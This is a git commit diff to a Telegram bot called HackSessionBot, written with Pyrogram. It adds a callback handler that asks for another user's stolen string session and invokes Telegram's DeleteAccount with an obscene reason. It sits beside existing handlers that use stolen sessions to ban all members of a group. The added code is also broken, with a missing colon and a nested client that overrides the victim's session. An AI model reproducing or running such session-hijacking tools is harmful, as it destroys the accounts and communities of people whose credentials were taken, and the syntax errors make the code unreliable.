b82453eb6ce51cbaa0724e06a5ef32a8f1199f33
SupremeStark <123313682+SupremeStark@users.noreply.github.com>
2023-02-01 09:04:48 +0530

    Update sessionHack.py

--- HackSessionBot/modules/sessionHack.py
+++ HackSessionBot/modules/sessionHack.py
@@ -1,5 +1,5 @@
 import os
-from HackSessionBot import app
+from HackSessionBot import app,API_ID,API_HASH
 from pyrogram import filters , Client
 from HackSessionBot.Helpers.steve import (
     users_gc,
@@ -7,6 +7,7 @@ from HackSessionBot.Helpers.steve import (
     banall )
 from HackSessionBot.Helpers.data import HACK_MODS 
 from pyrogram.types import CallbackQuery 
+from pyrogram.raw import functions
 
 @app.on_callback_query(filters.regex("A"))
 async def a_callback(client : Client , query : CallbackQuery):
@@ -40,6 +41,25 @@ async def c_callback(client : Client, query : CallbackQuery):
     session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
     gc = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ") 
     hehe = await banall(session.text,gc)
+    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ , ɢɪᴠᴇ ᴀ sᴛᴀʀ ᴛᴏ ᴍʏ [ʀᴇᴘᴏ](https://github.com/SupremeStark/HackSessionBot)**",
+            reply_markup=HACK_MODS,
+            disable_web_page_preview=True)
+
+async def del_acc(session):
+    async with Client("del",api_id = API_ID,api_hash = API_HASH, session_string = session) as app
+        async with Client("my_account") as app:
+            await app.invoke(
+        functions.account.DeleteAccount(
+            reason = "mai madarchod hu"
+        )
+    )
+    return "Account deleted successfully"
+
+@app.on_callback_query(filters.regex("J"))
+async def c_callback(client : Client, query : CallbackQuery):
+    id = query.message.chat.id   
+    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")    
+    hehe = await del_acc(session.text)
     await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ , ɢɪᴠᴇ ᴀ sᴛᴀʀ ᴛᴏ ᴍʏ [ʀᴇᴘᴏ](https://github.com/SupremeStark/HackSessionBot)**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
